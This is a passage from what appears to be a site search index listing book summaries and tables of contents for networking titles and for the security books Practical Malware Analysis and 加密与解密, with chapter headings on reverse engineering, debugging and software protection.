Approach* * builds on the author\u2019s long tradition of teaching this complex subject through a layered approach in a \u201ctop-down manner.\u201d The text works its way from the application layer down toward the physical layer, motivating readers by exposing them to important concepts early in their study of networking. Focusing on the Internet and the fundamentally important issues of networking, this text provides an excellent foundation for readers interested in computer science and electrical engineering, without requiring extensive knowledge of programming or mathematics. The Seventh Edition** has been updated to reflect the most important and exciting recent advances in networking.","title":"Overview"},{"location":"Book/Network/Computer%20Networking/#cover","text":"","title":"Cover"},{"location":"Book/Network/Practical%20Packet%20Analysis/","text":"Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems Author: Chris Sanders (Author) Overview It's easy to capture packets with Wireshark, the world's most popular network sniffer, whether off the wire or from the air. But how do you use those packets to understand what's happening on your network? With an expanded discussion of network protocols and 45 completely new scenarios, this extensively revised second edition of the best-selling Practical Packet Analysis will teach you how to make sense of your PCAP data. You'll find new sections on troubleshooting slow networks and packet analysis for security to help you better understand how modern exploits and malware behave at the packet level. Add to this a thorough introduction to the TCP/IP network stack and you're on your way to packet analysis proficiency. Learn how to: Use packet analysis to identify and resolve common network problems like loss of connectivity, DNS issues, sluggish speeds, and malware infections Build customized capture and display filters Monitor your network in real-time and tap live network communications Graph traffic patterns to visualize the data flowing across your network Use advanced Wireshark features to understand confusing captures Build statistics and reports to help you better explain technical network information to non-techies Practical Packet Analysis is a must for any network technician, administrator, or engineer. Stop guessing and start troubleshooting the problems on your network. Cover","title":"Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems"},{"location":"Book/Network/Practical%20Packet%20Analysis/#practical-packet-analysis-using-wireshark-to-solve-real-world-network-problems","text":"Author: Chris Sanders (Author)","title":"Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems"},{"location":"Book/Network/Practical%20Packet%20Analysis/#overview","text":"It's easy to capture packets with Wireshark, the world's most popular network sniffer, whether off the wire or from the air. But how do you use those packets to understand what's happening on your network? With an expanded discussion of network protocols and 45 completely new scenarios, this extensively revised second edition of the best-selling Practical Packet Analysis will teach you how to make sense of your PCAP data. You'll find new sections on troubleshooting slow networks and packet analysis for security to help you better understand how modern exploits and malware behave at the packet level. Add to this a thorough introduction to the TCP/IP network stack and you're on your way to packet analysis proficiency. Learn how to: Use packet analysis to identify and resolve common network problems like loss of connectivity, DNS issues, sluggish speeds, and malware infections Build customized capture and display filters Monitor your network in real-time and tap live network communications Graph traffic patterns to visualize the data flowing across your network Use advanced Wireshark features to understand confusing captures Build statistics and reports to help you better explain technical network information to non-techies Practical Packet Analysis is a must for any network technician, administrator, or engineer. Stop guessing and start troubleshooting the problems on your network.","title":"Overview"},{"location":"Book/Network/Practical%20Packet%20Analysis/#cover","text":"","title":"Cover"},{"location":"Book/Network/TCP%20IP%20Illustrated/","text":"TCP/IP Illustrated Author: W. Richard Stevens (Author) Overview Finally, programmers that need to truly understand the TCP/IP protocol suite have a resource to turn to, TCP/IP Illustrated. Instead of merely describing the RFC's, bestselling author Rich Stevens takes an innovative \"visual\" approach which, combined with his writing style, results in an accessible \"understandable\" guide to TCP/IP. Cover","title":"TCP/IP Illustrated"},{"location":"Book/Network/TCP%20IP%20Illustrated/#tcpip-illustrated","text":"Author: W. Richard Stevens (Author)","title":"TCP/IP Illustrated"},{"location":"Book/Network/TCP%20IP%20Illustrated/#overview","text":"Finally, programmers that need to truly understand the TCP/IP protocol suite have a resource to turn to, TCP/IP Illustrated. Instead of merely describing the RFC's, bestselling author Rich Stevens takes an innovative \"visual\" approach which, combined with his writing style, results in an accessible \"understandable\" guide to TCP/IP.","title":"Overview"},{"location":"Book/Network/TCP%20IP%20Illustrated/#cover","text":"","title":"Cover"},{"location":"Book/PWN/Practical%20Malware%20Analysis/","text":"Practical Malware Analysis \u4f5c\u8005: Michael Sikorski / Andrew Honig \u51fa\u7248\u793e: No Starch Press \u526f\u6807\u9898: The Hands-On Guide to Dissecting Malicious Software \u51fa\u7248\u5e74: 2012-2 \u9875\u6570: 760 \u5b9a\u4ef7: $ 67.74 ISBN: 9781593272906 \u5185\u5bb9\u7b80\u4ecb Malware analysis is big business, and attacks can cost a company dearly. When malware breaches your defenses, you need to act quickly to cure current infections and prevent future ones from occurring. For those who want to stay ahead of the latest malware, Practical Malware Analysis will teach you the tools and techniques used by professional analysts. With this book as your guide, you'll be able to safely analyze, debug, and disassemble any malicious software that comes your way. You'll learn how to: * Set up a safe virtual environment to analyze malware * Quickly extract network signatures and host-based indicators * Use key analysis tools like IDA Pro, OllyDbg, and WinDbg * Overcome malware tricks like obfuscation, anti-disassembly, anti-debugging, and anti-virtual machine techniques * Use your newfound knowledge of Windows internals for malware analysis * Develop a methodology for unpacking malware and get practical experience with five of the most popular packers * Analyze special cases of malware with shellcode, C++, and 64-bit code Hands-on labs throughout the book challenge you to practice and synthesize your skills as you dissect real malware samples, and pages of detailed dissections offer an over-the-shoulder look at how the pros do it. You'll learn how to crack open malware to see how it really works, determine what damage it has done, thoroughly clean your network, and ensure that the malware never comes back. Malware analysis is a cat-and-mouse game with rules that are constantly changing, so make sure you have the fundamentals. Whether you're tasked with securing one network or a thousand networks, or you're making a living as a malware analyst, you'll find what you need to succeed in Practical Malware Analysis. \u76ee\u5f55 Introduction Chapter 0: Malware Analysis Primer Part 1: Basic Analysis Chapter 1: Basic Static Techniques Chapter 2: Malware Analysis in Virtual Machines Chapter 3: Basic Dynamic Analysis Part 2: Advanced Static Analysis Chapter 4: A Crash Course in x86 Disassembly Chapter 5: IDA Pro Chapter 6: Recognizing C Code Constructs in Assembly Chapter 7: Analyzing Malicious Windows Programs Part 3: Advanced Dynamic Analysis Chapter 8: Debugging Chapter 9: OllyDbg Chapter 10: Kernel Debugging with WinDbg Part 4: Malware Functionality Chapter 11: Malware Behavior Chapter 12: Covert Malware Launching Chapter 13: Data Encoding Chapter 14: Malware-Focused Network Signatures Part 5: Anti-Reverse-Engineering Chapter 15: Anti-Disassembly Chapter 16: Anti-Debugging Chapter 17: Anti-Virtual Machine Techniques Chapter 18: Packers and Unpacking Part 6: Special Topics Chapter 19: Shellcode Analysis Chapter 20: C++ Analysis Chapter 21: 64-Bit Malware Appendix A: Important Windows Functions Appendix B: Tools for Malware Analysis Appendix C: Solutions to Labs","title":"Practical Malware Analysis"},{"location":"Book/PWN/Practical%20Malware%20Analysis/#practical-malware-analysis","text":"\u4f5c\u8005: Michael Sikorski / Andrew Honig \u51fa\u7248\u793e: No Starch Press \u526f\u6807\u9898: The Hands-On Guide to Dissecting Malicious Software \u51fa\u7248\u5e74: 2012-2 \u9875\u6570: 760 \u5b9a\u4ef7: $ 67.74 ISBN: 9781593272906","title":"Practical Malware Analysis"},{"location":"Book/PWN/Practical%20Malware%20Analysis/#_1","text":"Malware analysis is big business, and attacks can cost a company dearly. When malware breaches your defenses, you need to act quickly to cure current infections and prevent future ones from occurring. For those who want to stay ahead of the latest malware, Practical Malware Analysis will teach you the tools and techniques used by professional analysts. With this book as your guide, you'll be able to safely analyze, debug, and disassemble any malicious software that comes your way. You'll learn how to: * Set up a safe virtual environment to analyze malware * Quickly extract network signatures and host-based indicators * Use key analysis tools like IDA Pro, OllyDbg, and WinDbg * Overcome malware tricks like obfuscation, anti-disassembly, anti-debugging, and anti-virtual machine techniques * Use your newfound knowledge of Windows internals for malware analysis * Develop a methodology for unpacking malware and get practical experience with five of the most popular packers * Analyze special cases of malware with shellcode, C++, and 64-bit code Hands-on labs throughout the book challenge you to practice and synthesize your skills as you dissect real malware samples, and pages of detailed dissections offer an over-the-shoulder look at how the pros do it. You'll learn how to crack open malware to see how it really works, determine what damage it has done, thoroughly clean your network, and ensure that the malware never comes back. Malware analysis is a cat-and-mouse game with rules that are constantly changing, so make sure you have the fundamentals. Whether you're tasked with securing one network or a thousand networks, or you're making a living as a malware analyst, you'll find what you need to succeed in Practical Malware Analysis.","title":"\u5185\u5bb9\u7b80\u4ecb"},{"location":"Book/PWN/Practical%20Malware%20Analysis/#_2","text":"Introduction Chapter 0: Malware Analysis Primer Part 1: Basic Analysis Chapter 1: Basic Static Techniques Chapter 2: Malware Analysis in Virtual Machines Chapter 3: Basic Dynamic Analysis Part 2: Advanced Static Analysis Chapter 4: A Crash Course in x86 Disassembly Chapter 5: IDA Pro Chapter 6: Recognizing C Code Constructs in Assembly Chapter 7: Analyzing Malicious Windows Programs Part 3: Advanced Dynamic Analysis Chapter 8: Debugging Chapter 9: OllyDbg Chapter 10: Kernel Debugging with WinDbg Part 4: Malware Functionality Chapter 11: Malware Behavior Chapter 12: Covert Malware Launching Chapter 13: Data Encoding Chapter 14: Malware-Focused Network Signatures Part 5: Anti-Reverse-Engineering Chapter 15: Anti-Disassembly Chapter 16: Anti-Debugging Chapter 17: Anti-Virtual Machine Techniques Chapter 18: Packers and Unpacking Part 6: Special Topics Chapter 19: Shellcode Analysis Chapter 20: C++ Analysis Chapter 21: 64-Bit Malware Appendix A: Important Windows Functions Appendix B: Tools for Malware Analysis Appendix C: Solutions to Labs","title":"\u76ee\u5f55"},{"location":"Book/PWN/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/","text":"\u52a0\u5bc6\u4e0e\u89e3\u5bc6 \u4f5c\u8005: \u6bb5\u94a2 \u51fa\u7248\u793e: \u7535\u5b50\u5de5\u4e1a\u51fa\u7248\u793e \u51fa\u54c1\u65b9: \u535a\u6587\u89c6\u70b9 \u51fa\u7248\u5e74: 2018-10-1 \u9875\u6570: 936 \u5b9a\u4ef7: 198 \u88c5\u5e27: \u5e73\u88c5 \u4e1b\u4e66: \u5b89\u5168\u6280\u672f\u5927\u7cfb ISBN: 9787121336928 \u5185\u5bb9\u7b80\u4ecb \u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\uff08\u7b2c4\u7248\uff09\u300b\u4ee5\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u4e3a\u5207\u5165\u70b9\uff0c\u8bb2\u8ff0\u4e86\u8f6f\u4ef6\u5b89\u5168\u9886\u57df\u7684\u57fa\u7840\u77e5\u8bc6\u548c\u6280\u80fd\uff0c\u5982\u8c03\u8bd5\u6280\u80fd\u3001\u9006\u5411\u5206\u6790\u3001\u52a0\u5bc6\u4fdd\u62a4\u3001\u5916\u58f3\u5f00\u53d1\u3001\u865a\u62df\u673a\u8bbe\u8ba1\u7b49\u3002\u8fd9\u4e9b\u77e5\u8bc6\u5f7c\u6b64\u8054\u7cfb\uff0c\u8bfb\u8005\u5728\u638c\u63e1\u8fd9\u4e9b\u5185\u5bb9\u4e4b\u540e\uff0c\u5f88\u5bb9\u6613\u5c31\u80fd\u5728\u6f0f\u6d1e\u5206\u6790\u3001\u5b89\u5168\u7f16\u7a0b\u3001\u75c5\u6bd2\u5206\u6790\u3001\u8f6f\u4ef6\u4fdd\u62a4\u7b49\u9886\u57df\u8fdb\u884c\u6269\u5c55\u3002\u4ece\u5c31\u4e1a\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u638c\u63e1\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u7684\u76f8\u5173\u6280\u672f\uff0c\u53ef\u4ee5\u63d0\u9ad8\u81ea\u8eab\u7684\u7ade\u4e89\u80fd\u529b\uff1b\u4ece\u4e2a\u4eba\u6210\u957f\u7684\u89d2\u5ea6\u6765\u8bf4\uff0c\u7814\u7a76\u8f6f\u4ef6\u5b89\u5168\u6280\u672f\u6709\u52a9\u4e8e\u638c\u63e1\u4e00\u4e9b\u7cfb\u7edf\u5e95\u5c42\u77e5\u8bc6\uff0c\u662f\u63d0\u5347\u804c\u4e1a\u6280\u80fd\u7684\u91cd\u8981\u9014\u5f84\u3002\u4f5c\u4e3a\u4e00\u540d\u5408\u683c\u7684\u7a0b\u5e8f\u5458\uff0c\u9664\u4e86\u638c\u63e1\u9700\u6c42\u5206\u6790\u3001\u8bbe\u8ba1\u6a21\u5f0f\u7b49\u5916\uff0c\u5982\u679c\u80fd\u638c\u63e1\u4e00\u4e9b\u7cfb\u7edf\u5e95\u5c42\u77e5\u8bc6\u3001\u719f\u6089\u6574\u4e2a\u7cfb\u7edf\u7684\u5e95\u5c42\u7ed3\u6784\uff0c\u5728\u5de5\u4f5c\u4e2d\u5fc5\u5c06\u83b7\u76ca\u826f\u591a\u3002 \u300a\u52a0\u5bc6\u4e0e\u89e3\u5bc6\uff08\u7b2c4\u7248\uff09\u300b\u9002\u5408\u5b89\u5168\u7814\u7a76\u4eba\u5458\u3001\u8f6f\u4ef6\u8c03\u8bd5\u4eba\u5458\u3001\u7a0b\u5e8f\u5f00\u53d1\u4eba\u5458\u9605\u8bfb\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u9ad8\u6821\u4fe1\u606f\u5b89\u5168\u76f8\u5173\u4e13\u4e1a\u7684\u8f85\u52a9\u6559\u6750\u3002 \u76ee\u5f55 \u57fa\u7840\u7bc7 \u7b2c1\u7ae0 \u57fa\u7840\u77e5\u8bc6 2 1.1 \u4ec0\u4e48\u662f\u52a0\u5bc6\u4e0e\u89e3\u5bc6 2 1.1.1 \u8f6f\u4ef6\u7684\u52a0\u5bc6\u4e0e\u89e3\u5bc6 2 1.1.2 \u8f6f\u4ef6\u9006\u5411\u5de5\u7a0b 2 1.1.3 \u9006\u5411\u5206\u6790\u6280\u672f 3 1.2 \u6587\u672c\u5b57\u7b26 4 1.2.1 ASCII\u4e0eUnicode\u5b57\u7b26\u96c6 4 1.2.2 \u5b57\u8282\u5b58\u50a8\u987a\u5e8f 6 1.3 Windows\u64cd\u4f5c\u7cfb\u7edf 6 1.3.1 Win32 API\u51fd\u6570 6 1.3.2 WOW64 9 1.3.3 Windows\u6d88\u606f\u673a\u5236 9 1.3.4 \u865a\u62df\u5185\u5b58 11 \u8c03\u8bd5\u7bc7 \u7b2c2\u7ae0 \u52a8\u6001\u5206\u6790\u6280\u672f 14 2.1 OllyDbg\u8c03\u8bd5\u5668 14 2.1.1 OllyDbg\u7684\u754c\u9762 14 2.1.2 OllyDbg\u7684\u914d\u7f6e 15 2.1.3 \u57fa\u672c\u64cd\u4f5c 16 2.1.4 \u5e38\u7528\u65ad\u70b9 27 2.1.5 \u63d2\u4ef6 35 2.1.6 Run trace 36 2.1.7 Hit trace 37 2.1.8 \u8c03\u8bd5\u7b26\u53f7 37 2.1.9 \u52a0\u8f7d\u7a0b\u5e8f 39 2.1.10 OllyDbg\u7684\u5e38\u89c1\u95ee\u9898 40 2.2 x64dbg\u8c03\u8bd5\u5668 42 2.3 MDebug\u8c03\u8bd5\u5668 44 2.3.1 MDebug\u7684\u754c\u9762 44 2.3.2 \u8868\u8fbe\u5f0f 45 2.3.3 \u8c03\u8bd5 45 2.3.4 \u65ad\u70b9 46 2.3.5 MDebug\u7684\u5176\u4ed6\u529f\u80fd 47 2.4 WinDbg\u8c03\u8bd5\u5668 47 2.4.1 WinDbg\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e 47 2.4.2 \u8c03\u8bd5\u8fc7\u7a0b 51 2.4.3 \u65ad\u70b9\u547d\u4ee4 51 2.4.4 \u6808\u7a97\u53e3 53 2.4.5 \u5185\u5b58\u547d\u4ee4 55 2.4.6 \u811a\u672c 56 2.4.7 \u8c03\u8bd5\u529f\u80fd\u6269\u5c55 58 2.4.8 \u5c0f\u7ed3 59 \u7b2c3\u7ae0 \u9759\u6001\u5206\u6790\u6280\u672f 60 3.1 \u6587\u4ef6\u7c7b\u578b\u5206\u6790 60 3.2 \u53cd\u6c47\u7f16\u5f15\u64ce 61 3.2.1 OllyDbg\u7684ODDisasm 61 3.2.2 BeaEngine 61 3.2.3 Udis86 61 3.2.4 Capstone 62 3.2.5 AsmJit 63 3.2.6 Keystone 64 3.2.7 \u5c0f\u7ed3 64 3.3 \u9759\u6001\u53cd\u6c47\u7f16 65 3.3.1 IDA Pro\u7b80\u4ecb 65 3.3.2 IDA\u7684\u914d\u7f6e 66 3.3.3 IDA\u4e3b\u7a97\u53e3 68 3.3.4 \u4ea4\u53c9\u53c2\u8003 69 3.3.5 \u53c2\u8003\u91cd\u547d\u540d 70 3.3.6 \u6807\u7b7e\u7684\u7528\u6cd5 71 3.3.7 \u683c\u5f0f\u5316\u6307\u4ee4\u64cd\u4f5c\u6570 71 3.3.8 \u51fd\u6570\u7684\u64cd\u4f5c 72 3.3.9 \u4ee3\u7801\u548c\u6570\u636e\u8f6c\u6362 72 3.3.10 \u5b57\u7b26\u4e32 73 3.3.11 \u6570\u7ec4 74 3.3.12 \u7ed3\u6784\u4f53 75 3.3.13 \u679a\u4e3e\u7c7b\u578b 79 3.3.14 \u53d8\u91cf 80 3.3.15 FLIRT 81 3.3.16 IDC\u811a\u672c 82 3.3.17 \u63d2\u4ef6 86 3.3.18 IDA\u8c03\u8bd5\u5668 87 3.3.19 \u8fdc\u7a0b\u8c03\u8bd5 90 3.3.20 \u5176\u4ed6\u529f\u80fd 93 3.3.21 \u5c0f\u7ed3 94 3.4 \u5341\u516d\u8fdb\u5236\u5de5\u5177 94 3.5 \u9759\u6001\u5206\u6790\u6280\u672f\u5e94\u7528\u5b9e\u4f8b 97 3.5.1 \u89e3\u5bc6\u521d\u6b65 97 3.5.2 \u9006\u5411\u5de5\u7a0b\u521d\u6b65 99 \u89e3\u5bc6\u7bc7 \u7b2c4\u7ae0 \u9006\u5411\u5206\u6790\u6280\u672f 102 4.1 32\u4f4d\u8f6f\u4ef6\u9006\u5411\u6280\u672f 102 4.1.1 \u542f\u52a8\u51fd\u6570 102 4.1.2 \u51fd\u6570 103 4.1.3 \u6570\u636e\u7ed3\u6784 111 4.1.4 \u865a\u51fd\u6570 115 4.1.5 \u63a7\u5236\u8bed\u53e5 117 4.1.6 \u5faa\u73af\u8bed\u53e5 124 4.1.7 \u6570\u5b66\u8fd0\u7b97\u7b26 125 4.1.8 \u6587\u672c\u5b57\u7b26\u4e32 128 4.1.9 \u6307\u4ee4\u4fee\u6539\u6280\u5de7 130 4.2 64\u4f4d\u8f6f\u4ef6\u9006\u5411\u6280\u672f 131 4.2.1 \u5bc4\u5b58\u5668 131 4.2.2 \u51fd\u6570 132 4.2.3 \u6570\u636e\u7ed3\u6784 142 4.2.4 \u63a7\u5236\u8bed\u53e5 145 4.2.5 \u5faa\u73af\u8bed\u53e5 154 4.2.6 \u6570\u5b66\u8fd0\u7b97\u7b26 158 4.2.7 \u865a\u51fd\u6570 169 4.2.8 \u5c0f\u7ed3 193 \u7b2c5\u7ae0 \u6f14\u793a\u7248\u4fdd\u62a4\u6280\u672f 194 5.1 \u5e8f\u5217\u53f7\u4fdd\u62a4\u65b9\u5f0f 194 5.1.1 \u5e8f\u5217\u53f7\u4fdd\u62a4\u673a\u5236 194 5.1.2 \u5982\u4f55\u653b\u51fb\u5e8f\u5217\u53f7\u4fdd\u62a4\u673a\u5236 195 5.1.3 \u5b57\u7b26\u4e32\u6bd4\u8f83\u5f62\u5f0f 197 5.1.4 \u5236\u4f5c\u6ce8\u518c\u673a 198 5.2 \u8b66\u544a\u7a97\u53e3 203 5.3 \u65f6\u95f4\u9650\u5236 205 5.3.1 \u8ba1\u65f6\u5668 205 5.3.2 \u65f6\u95f4\u9650\u5236 205 5.3.3 \u62c6\u89e3\u65f6\u95f4\u9650\u5236\u4fdd\u62a4 206 5.4 \u83dc\u5355\u529f\u80fd\u9650\u5236 207 5.4.1 \u76f8\u5173\u51fd\u6570 207 5.4.2 \u62c6\u89e3\u83dc\u5355\u9650\u5236\u4fdd\u62a4 208 5.5 KeyFile\u4fdd\u62a4 208 5.5.1 \u76f8\u5173API\u51fd\u6570 208 5.5.2 \u62c6\u89e3KeyFile\u4fdd\u62a4 209 5.6 \u7f51\u7edc\u9a8c\u8bc1 213 5.6.1 \u76f8\u5173\u51fd\u6570 214 5.6.2 \u7834\u89e3\u7f51\u7edc\u9a8c\u8bc1\u7684\u4e00\u822c\u601d\u8def 214 5.7 \u5149\u76d8\u68c0\u6d4b 219 5.7.1 \u76f8\u5173\u51fd\u6570 219 5.7.2 \u62c6\u89e3\u5149\u76d8\u4fdd\u62a4 220 5.8 \u53ea\u8fd0\u884c1\u4e2a\u5b9e\u4f8b 221 5.8.1 \u5b9e\u73b0\u65b9\u6cd5 221 5.8.2 \u5b9e\u4f8b 222 5.9 \u5e38\u7528\u65ad\u70b9\u8bbe\u7f6e\u6280\u5de7 222 \u7b2c6\u7ae0 \u52a0\u5bc6\u7b97\u6cd5 223 6.1 \u5355\u5411\u6563\u5217\u7b97\u6cd5 223 6.1.1 MD5\u7b97\u6cd5 223 6.1.2 SHA\u7b97\u6cd5 227 6.1.3 SM3\u5bc6\u7801\u6742\u51d1\u7b97\u6cd5 231 6.1.4 \u5c0f\u7ed3 231 6.2 \u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5 231 6.2.1 RC4\u6d41\u5bc6\u7801 231 6.2.2 TEA\u7b97\u6cd5 233 6.2.3 IDEA\u7b97\u6cd5 236 6.2.4 BlowFish\u7b97\u6cd5 243 6.2.5 AES\u7b97\u6cd5 246 6.2.6 SM4\u5206\u7ec4\u5bc6\u7801\u7b97\u6cd5 259 6.2.7 \u5c0f\u7ed3 259 6.3 \u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6\u7b97\u6cd5 259 6.3.1 RSA\u7b97\u6cd5 260 6.3.2 ElGamal\u516c\u94a5\u7b97\u6cd5 264 6.3.3 DSA\u6570\u5b57\u7b7e\u540d\u7b97\u6cd5 270 6.3.4 \u692d\u5706\u66f2\u7ebf\u5bc6\u7801\u7f16\u7801\u5b66 272 6.3.5 SM2\u7b97\u6cd5 279 6.4 \u5176\u4ed6\u7b97\u6cd5 279 6.4.1 CRC32\u7b97\u6cd5 279 6.4.2 Base64\u7f16\u7801 280 6.5 \u5e38\u89c1\u7684\u52a0\u5bc6\u5e93\u63a5\u53e3\u53ca\u5176\u8bc6\u522b 281 6.5.1 Miracl\u5927\u6570\u8fd0\u7b97\u5e93 281 6.5.2 FGInt 283 6.5.3 \u5176\u4ed6\u52a0\u5bc6\u7b97\u6cd5\u5e93\u4ecb\u7ecd 284 6.6 \u52a0\u5bc6\u7b97\u6cd5\u5728\u8f6f\u4ef6\u4fdd\u62a4\u4e2d\u7684\u5e94\u7528 285 \u7cfb\u7edf\u7bc7 \u7b2c7\u7ae0 Windows\u5185\u6838\u57fa\u7840 290 7.1 \u5185\u6838\u7406\u8bba\u57fa\u7840 290 7.1.1 \u6743\u9650\u7ea7\u522b 290 7.1.2 \u5185\u5b58\u7a7a\u95f4\u5e03\u5c40 291 7.1.3 Windows\u4e0e\u5185\u6838\u542f\u52a8\u8fc7\u7a0b 292 7.1.4 Windows R3\u4e0eR0\u901a\u4fe1 294 7.1.5 \u5185\u6838\u51fd\u6570 296 7.1.6 \u5185\u6838\u9a71\u52a8\u6a21\u5757 297 7.2 \u5185\u6838\u91cd\u8981\u6570\u636e\u7ed3\u6784 298 7.2.1 \u5185\u6838\u5bf9\u8c61 298 7.2.2 SSDT 300 7.2.3 TEB 302 7.2.4 PEB 304 7.3 \u5185\u6838\u8c03\u8bd5\u57fa\u7840 306 7.3.1 \u4f7f\u7528WinDbg\u642d\u5efa\u53cc\u673a\u8c03\u8bd5\u73af\u5883 306 7.3.2 \u52a0\u8f7d\u5185\u6838\u9a71\u52a8\u5e76\u8bbe\u7f6e\u7b26\u53f7\u8868 308 7.3.3 SSDT\u4e0eShadow SSDT\u7684\u67e5\u770b 311 \u7b2c8\u7ae0 Windows\u4e0b\u7684\u5f02\u5e38\u5904\u7406 313 8.1 \u5f02\u5e38\u5904\u7406\u7684\u57fa\u672c\u6982\u5ff5 313 8.1.1 \u5f02\u5e38\u5217\u8868 313 8.1.2 \u5f02\u5e38\u5904\u7406\u7684\u57fa\u672c\u8fc7\u7a0b 314 8.2 SEH\u7684\u6982\u5ff5\u53ca\u57fa\u672c\u77e5\u8bc6 319 8.2.1 SEH\u7684\u76f8\u5173\u6570\u636e\u7ed3\u6784 319 8.2.2 SEH\u5904\u7406\u7a0b\u5e8f\u7684\u5b89\u88c5\u548c\u5378\u8f7d 320 8.2.3 SEH\u5b9e\u4f8b\u8ddf\u8e2a 321 8.3 SEH\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u539f\u7406\u53ca\u8bbe\u8ba1 325 8.3.1 \u5f02\u5e38\u5206\u53d1\u7684\u8be6\u7ec6\u8fc7\u7a0b 325 8.3.2 \u7ebf\u7a0b\u5f02\u5e38\u5904\u7406 330 8.3.3 \u5f02\u5e38\u5904\u7406\u7684\u6808\u5c55\u5f00 336 8.3.4 MSC\u7f16\u8bd1\u5668\u5bf9\u7ebf\u7a0b\u5f02\u5e38\u5904\u7406\u7684\u589e\u5f3a 342 8.3.5 \u9876\u5c42\u5f02\u5e38\u5904\u7406 349 8.3.6 \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u7684\u5b89\u5168\u6027 357 8.4 \u5411\u91cf\u5316\u5f02\u5e38\u5904\u7406 361 8.4.1 \u5411\u91cf\u5316\u5f02\u5e38\u5904\u7406\u7684\u4f7f\u7528 361 8.4.2 VEH\u4e0eSEH\u7684\u5f02\u540c 362 8.4.3 \u5411\u91cf\u5316\u5f02\u5e38\u5904\u7406\u7684\u65b0\u5185\u5bb9 363 8.5 x64\u5e73\u53f0\u4e0a\u7684\u5f02\u5e38\u5904\u7406 363 8.5.1 \u539f\u751fx64\u7a0b\u5e8f\u7684\u5f02\u5e38\u5206\u53d1 364 8.5.2 WOW64\u4e0b\u7684\u5f02\u5e38\u5206\u53d1 366 8.6 \u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u8bbe\u8ba1\u4e2d\u7684\u6ce8\u610f\u4e8b\u9879 367 8.7 \u5f02\u5e38\u5904\u7406\u7684\u5b9e\u9645\u5e94\u7528 368 8.7.1 \u4f7f\u7528SEH\u5bf9\u7528\u6237\u8f93\u5165\u8fdb\u884c\u9a8c\u8bc1 368 8.7.2 SEH\u5728\u52a0\u5bc6\u4e0e\u89e3\u5bc6\u4e2d\u7684\u5e94\u7528 369 8.7.3 \u7528VEH\u5b9e\u73b0API Hook 371 8.8 \u672c\u7ae0\u5c0f\u7ed3 371 \u7b2c9\u7ae0 Win32\u8c03\u8bd5API 372 9.1 \u8c03\u8bd5\u76f8\u5173\u51fd\u6570\u7b80\u8981\u8bf4\u660e 372 9.2 \u8c03\u8bd5\u4e8b\u4ef6 375 9.3 \u521b\u5efa\u5e76\u8ddf\u8e2a\u8fdb\u7a0b 377 9.4 \u8c03\u8bd5\u5faa\u73af\u4f53 378 9.5 \u5904\u7406\u8c03\u8bd5\u4e8b\u4ef6 379 9.6 \u7ebf\u7a0b\u73af\u5883 380 9.7 \u5c06\u4ee3\u7801\u6ce8\u5165\u8fdb\u7a0b 382 \u7b2c10\u7ae0 VT\u6280\u672f 384 10.1 \u786c\u4ef6\u865a\u62df\u5316\u7684\u57fa\u672c\u6982\u5ff5 384 10.1.1 \u6982\u8ff0 384 10.1.2 \u76f8\u5173\u7ed3\u6784\u548c\u6c47\u7f16\u6307\u4ee4 385 10.1.3 EPT\u673a\u5236 388 10.2 VT\u6280\u672f\u7684\u5e94\u7528 389 10.2.1 \u7f16\u8bd1\u8fd0\u884cShadowWalker 389 10.2.2 \u5206\u6790Hypervisor 390 10.2.3 \u68c0\u6d4bVT\u652f\u6301\u60c5\u51b5 392 10.2.4 VMCS\u7684\u914d\u7f6e 393 10.2.5 EPT\u7684\u914d\u7f6e 396 10.2.6 \u5f00\u542fVT 399 10.2.7 \u5185\u5b58\u9690\u85cf\u7684\u5b9e\u73b0 399 10.3 VT\u8c03\u8bd5\u65b9\u6cd5 401 \u7b2c11\u7ae0 PE\u6587\u4ef6\u683c\u5f0f 404 11.1 PE\u7684\u57fa\u672c\u6982\u5ff5 405 11.1.1 \u57fa\u5730\u5740 405 11.1.2 \u865a\u62df\u5730\u5740 406 11.1.3 \u76f8\u5bf9\u865a\u62df\u5730\u5740 406 11.1.4 \u6587\u4ef6\u504f\u79fb\u5730\u5740 407 11.2 MS-DOS\u5934\u90e8 407 11.3 PE\u6587\u4ef6\u5934 408 11.3.1 Signature\u5b57\u6bb5 408 11.3.2 IMAGE_FILE_HEADER\u7ed3\u6784 409 11.3.3 IMAGE_OPTIONAL_HEADER\u7ed3\u6784 410 11.4 \u533a\u5757 415 11.4.1 \u533a\u5757\u8868 415 11.4.2 \u5e38\u89c1\u533a\u5757\u4e0e\u533a\u5757\u5408\u5e76 417 11.4.3 \u533a\u5757\u7684\u5bf9\u9f50\u503c 419 11.4.4 \u6587\u4ef6\u504f\u79fb\u4e0e\u865a\u62df\u5730\u5740\u7684\u8f6c\u6362 419 11.5 \u8f93\u5165\u8868 421 11.5.1 \u8f93\u5165\u51fd\u6570\u7684\u8c03\u7528 421 11.5.2 \u8f93\u5165\u8868\u7684\u7ed3\u6784 422 11.5.3 \u8f93\u5165\u5730\u5740\u8868 424 11.5.4 \u8f93\u5165\u8868\u5b9e\u4f8b\u5206\u6790 424 11.6 \u7ed1\u5b9a\u8f93\u5165 428 11.7 \u8f93\u51fa\u8868 429 11.7.1 \u8f93\u51fa\u8868\u7684\u7ed3\u6784 430 11.7.2 \u8f93\u51fa\u8868\u5b9e\u4f8b\u5206\u6790 431 11.8 \u57fa\u5740\u91cd\u5b9a\u4f4d 432 11.8.1 \u57fa\u5740\u91cd\u5b9a\u4f4d\u7684\u6982\u5ff5 432 11.8.2 \u57fa\u5740\u91cd\u5b9a\u4f4d\u8868\u7684\u7ed3\u6784 433 11.8.3 \u57fa\u5740\u91cd\u5b9a\u4f4d\u8868\u5b9e\u4f8b\u5206\u6790 434 11.9 \u8d44\u6e90 435 11.9.1 \u8d44\u6e90\u7ed3\u6784 435 11.9.2 